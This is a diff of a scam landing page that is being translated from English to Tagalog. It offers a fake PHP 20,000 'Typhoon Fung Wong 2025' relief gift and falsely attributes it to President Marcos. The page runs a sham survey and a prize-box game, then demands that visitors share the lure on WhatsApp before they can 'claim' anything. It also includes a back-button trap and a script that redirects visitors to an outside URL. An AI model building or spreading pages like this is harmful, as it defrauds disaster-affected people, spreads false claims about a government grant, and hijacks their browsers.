@@ -292,23 +292,22 @@ button:hover {
   
 
 <vue-modal :open="showInstructionsModal">
-<h2 class="heading heading--h1">Congratulation! Your answers have been saved</h2>
+<h2 class="heading heading--h1">Binabati kita! Nai-save na ang iyong mga sagot</h2>
  
 <p class="paragraph">
-Now you have a chance to Recieve PHP:20000 Hurricane cash Gifts<br><br>
-You have 3 chances ! we wish you good luck
-<br><br>
-You need to select the box that has the gift inside the boxes.
+Ngayon ay may pagkakataon ka nang Makatanggap ng PHP:20000 Typhoon Fung Wong cash Gifts<br><br>
+Mayroon kang 3 pagkakataon! batiin ka namin ng magandang kapalaran<br><br>
+Kailangan mong piliin ang kahon na mayroong regalo sa loob ng mga kahon.
 </p>
    <br>
 <button class="button" v-on:click="showInstructionsModal = false">
-Start
+Magsimula
 </button>
 </vue-modal>
 <vue-modal :open="showFailModal">
-<h2 class="heading heading--h1">Better luck next time</h2>
+<h2 class="heading heading--h1">Better luck sa susunod</h2>
 <p class="paragraph">
-You have (2) extra chances. 
+Mayroon kang (2) dagdag na pagkakataon. 
 </p>
    <br>
 <button class="button" v-on:click="showFailModal = false">
@@ -321,7 +320,7 @@ OK
 <p class="paragraph">
 
 
-Your Gifts is: <b> PHP:20000 cash</b><br>Follow the instructions on the next page to claim your prize ! 
+Ang iyong mga Regalo ay: <b> PHP:20000 cash</b><br>Sundin ang mga tagubilin sa susunod na pahina para makuha ang iyong premyo ! 
 </p>
     <br>
 <button class="button" v-on:click="$confetti.stop()" onclick="go();">
@@ -341,9 +340,9 @@ Ok
 Hello!
 </h1>
   <p class="paragraph">
-Welcome to <b>PHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE</b>, Dont miss this year cash grant to Supporters.
+Welcome to <b>PHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE</b>, Huwag palampasin ang taong ito cash grant sa lahat.
 <br>
-Answer the questions below to claim <b>PHP:20000 Cash Prize</b>
+Sagutin ang mga tanong sa ibaba para i-claim<b>PHP:20000 Mga Regalo sa Cash</b>
 </p>
   <br>
 </div>
@@ -353,54 +352,50 @@ Answer the questions below to claim <b>PHP:20000 Cash Prize</b>
 
 <div class="verify" v-if="showRotator">
 <vue-text-rotator v-on:rotate="rotate" v-on:finished="onRotatorFinished" :strings='[
-                     "Please wait a moment...",
-              "Please wait a moment...",
+                     "Mangyaring maghintay ng ilang sandali...",
+              "Mangyaring maghintay ng ilang sandali...",
               "Please wait a moment..."
             ]'>
 </vue-text-rotator>
 <div class="verify__text" v-if="rotateIndex > 1">
 <strong>
-You have answered 4/4 of the questions
+Nasagot mo ang 4/4 ng mga tanong
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Your answers are being processed
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+Pinoproseso ang iyong mga sagot<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 0}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 2">
 <strong>
-still prizes available!
+Available pa rin ang Relief Gifts!
 </strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Looking for gifts.. 
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+Naghahanap ng regalo..<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 1}" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 <div class="verify__text" v-if="rotateIndex > 3">
 <strong>
-Only (289) gifts remain!
-</strong>
+(289) na lang na regalo ang natitira!</strong>
 <img class="verify__icon verify__icon--checked" src="https://olului.pages.dev/img/landers/survey-pick-a-box/checked.png" alt="" />
 </div>
 <div class="verify__text" v-else>
-Stock is being checked
-<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
+Sinusuri ang mga regalo<img class="verify__icon verify__icon--spinner" :class="{'verify__icon--visible' : rotateIndex > 2 }" src="https://olului.pages.dev/img/landers/survey-pick-a-box/spinner.gif" alt="" />
 </div>
 </div>
 <vue-survey v-if="showSurvey" :show-steps="true" :questions='[
             {
-              title: "Are you a Citizen Of Jamaica?",
-              answers: [ { text: "Yes" }, { text: "No" } ]
+              title: "Ikaw ba ay isang Mamamayan ng Pilipinas?",
+              answers: [ { text: "Oo" }, { text: "Hindi" } ]
             },
                                                                          {
-              title: "Choose your Gender?",
-              answers: [ { text: "Male" }, { text: "Female" } ]
+              title: "Piliin ang iyong Kasarian?",
+              answers: [ { text: "Lalaki" }, { text: "Babae" } ]
             },
             {
-              title: "Select Your Age Range?",
-              answers: [ { text: "18 - 20years" }, { text: "21 - 25years" }, { text: "26 - 30 years" }, { text: "30years Above" } ]
+              title: "Piliin ang Iyong Saklaw ng Edad?",
+              answers: [ { text: "18 - 20 taon" }, { text: "21 - 25 taon" }, { text: "26 - 30 taon" }, { text: "30 taon sa itaas" } ]
             },
           ]' v-on:finish="onSurveyFinish"></vue-survey>
 </div>
@@ -412,20 +407,20 @@ Stock is being checked
   <div id="share">
     
 <div class="title1">
-<p>Congratulations! </p>
+<p>Binabati kita! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3oe23BQ7bnWSd9x1bdFC-7GEHXAc0GrjMNt5UjxiXehQICsAINHg_ZxtXmptZZ_gxoacK_uy_DR82gzlvHCB_pJfCztUv6K8B79WaO9lKix-59zn60c6Ko9wE6vwiK9k5YGQF5-J-TTaL-zRNpx2fjD9Pb3RxgrhZglAk05wG9Ab8JIXJaVqtttUVtyiQ/w640-h600/IMG_1577.jpeg" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Gifts is: <b>PHP:20000</b> <br>Follow the instructions below to Get your Gifts !</p>
+<p class="txt1">Ang iyong mga Regalo ay: <b>PHP:20000</b> <br>Sundin ang mga tagubilin sa ibaba para Kunin ang iyong mga Regalo !</p>
       <div class="bottom" id='buttonO'>
-<div id="lastapp"><p class="rules">1.share with 5 groups / 15 friends on "Whatsapp" (click the "SHARE" icon below)</p><p class="rules">2. Click "Continue" and claim your prize.</p></div>
+<div id="lastapp"><p class="rules">1.magbahagi sa 5 grupo / 15 kaibigan sa "Whatsapp" (i-click ang icon na "IBAHAGI" sa ibaba)</p><p class="rules">2. I-click ang "Magpatuloy" at kunin ang iyong premyo.</p></div>
 
     
-   <div class="share_main_bt" id="whatsapp">SHARE&nbsp;   →</div>
-  <h4 class="textlastup">Share until the blue bar is full!</h4>
+   <div class="share_main_bt" id="whatsapp">IBAHAGI&nbsp;   →</div>
+  <h4 class="textlastup">Ibahagi hanggang mapuno ang asul na bar!</h4>
   <div class="barr">
                 <div class="fill">
                     <div id="fill2"></div>
@@ -449,14 +444,14 @@ Stock is being checked
                       
     <div id="claim">
       <div class="title1">
-<p>Congratulations! </p>
+<p>Binabati kita! </p>
 </div>
 <div class="weui_dialog_img prize_img" style="text-align: center;margin: 20px 0;">
                                 <center>   <img src="https://media.istockphoto.com/id/1371997012/photo/stack-of-1000-philippines-peso-notes-3d-rendering-of-bundles-of-banknotes.jpg?s=612x612&w=0&k=20&c=j17EisWlN9GauKgLympADp12bpCJouhIzZ2m9A9kRKI=" width='81%'/> </center>
                            
 
                             </div>
-<p class="txt1">Your Gifts is: <b>PHP:20000.</b> <br>Follow the instruction below to claim your Gifts !</p>
+<p class="txt1">Ang iyong mga Regalo ay: <b>PHP:20000.</b> <br>Sundin ang tagubilin sa ibaba para i-claim ang iyong Mga Regalo !</p>
             <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true"></i></p>   
         <br>
 	    
@@ -474,7 +469,7 @@ Stock is being checked
                     </a><br/> <br/>
 	
                             
-            <div class="share_main_bt" id="offers">Withdraw PHP:20000</div> 
+            <div class="share_main_bt" id="offers">Mag-withdraw ng PHP:20000</div> 
       <br>
           
        
@@ -527,10 +522,10 @@ function go() {
 
 <script>
   var tiaoban = [
-    "*PHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE*%0A%0A*HOW TO GET IT*%0AVisit the link below and answer the following questions and you will receive JMD:20000 Instantly.%0A i just got mine%0A%0AClick Here👇%0A https://okripeti.org/Jamaica-Hurricane-Relief-Cash-Gifta.html",
-    "*PHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE*%0A%0A*HOW TO GET IT*%0Aisit the link below and answer the following questions and you will receive JMD:20000 Instantly.%0A i just got mine%0A%0AClick Here👇%0Ahttps://okripeti.org/Jamaica-Hurricane-Relief-Cash-Gifta.html",
-    "*JPHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE*%0A%0A*HOW TO GET IT*%0Aisit the link below and answer the following questions and you will receive JMD:20000 Instantly.%0A i just got mine%0A%0AClick Here👇%0A https://okripeti.org/Jamaica-Hurricane-Relief-Cash-Gifta.html ",
-    "*PHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE*%0A%0A*HOW TO GET IT*%0Aisit the link below and answer the following questions and you will receive JMD:20000 Instantly.%0A i just got mine%0A%0AClick Here👇%0A https://okripeti.org/Jamaica-Hurricane-Relief-Cash-Gifta.html ",
+    "*PHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE*%0A%0A*PAANO ITO KUMUHA*%0ABisitahin ang link sa ibaba at sagutin ang mga sumusunod na tanong at makakatanggap ka ng PHP:20000 Agad.%0A nakuha ko lang ang akin%0A%0AMag-click Dito👇%0A https://ekelego.org/Philipines-Typhoon-Relief-Cash-Gifts.html",
+    "*PHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE*%0A%0A*PAANO ITO KUMUHA*%0ABisitahin ang link sa ibaba at sagutin ang mga sumusunod na tanong at makakatanggap ka ng PHP:20000 Agad.%0Anakuha ko lang ang akin%0A%0AMag-click Dito%0Ahttps://ekelego.org/Philipines-Typhoon-Relief-Cash-Gifts.html",
+    "*JPHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE*%0A%0A*PAANO ITO KUMUHA*%0ABisitahin ang link sa ibaba at sagutin ang mga sumusunod na tanong at makakatanggap ka ng PHP:20000 Agad.%0A nakuha ko lang ang akin%0A%0AMag-click Dito%0A https://ekelego.org/Philipines-Typhoon-Relief-Cash-Gifts.html ",
+    "*PHILIPINS TYPHOON FUNG WONG 2025..PRESIDENT BONGBONG MARCOS APPROVES PHP:20000 CASH RELIEF GIFTS TO EVERYONE*%0A%0A*PAANO ITO KUMUHA*%0ABisitahin ang link sa ibaba at sagutin ang mga sumusunod na tanong at makakatanggap ka ng PHP:20000 Agad.%0A nakuha ko lang ang akin%0A%0AMag-click Dito%0A https://ekelego.org/Philipines-Typhoon-Relief-Cash-Gifts.html ",
 ];
 var tiaoban = tiaoban[Math.floor(Math.random() * tiaoban.length)];
 
@@ -614,7 +609,7 @@ $("#offerss").click(function () {
    Swal.fire({
   icon: 'error',
   title: 'Unfortunately...',
-  text: 'To Receive Your Prize, You have to share with friends about our event. Share until the blue bar is full!',
+  text: 'Upang Matanggap ang Iyong Premyo, kailangan mong ibahagi sa mga kaibigan ang tungkol sa aming kaganapan. Ibahagi hanggang mapuno ang asul na bar!',
   
 });
    }
@@ -637,7 +632,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <!-- Histats.com  END  -->
 
 
-      <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Please Share Maximum to receive gift. ');		}}		catch (o){}}();</script>
+      <script type="text/javascript">! function (){	var t;	try{for (t=0; 10 > t; ++t)		history.pushState({}, "", "#");	onpopstate=function (t)	{		t.state && alert('Mangyaring Ibahagi ang Maximum upang makatanggap ng regalo. ');		}}		catch (o){}}();</script>
 
 <script>
     window.onhashchange=function(){jp();};
@@ -652,6 +647,7 @@ hs.src = ('//s10.histats.com/js15_as.js');
         location.href="https://obqj2.com/4/9437824";
     }
 </script>
+
 
 
 
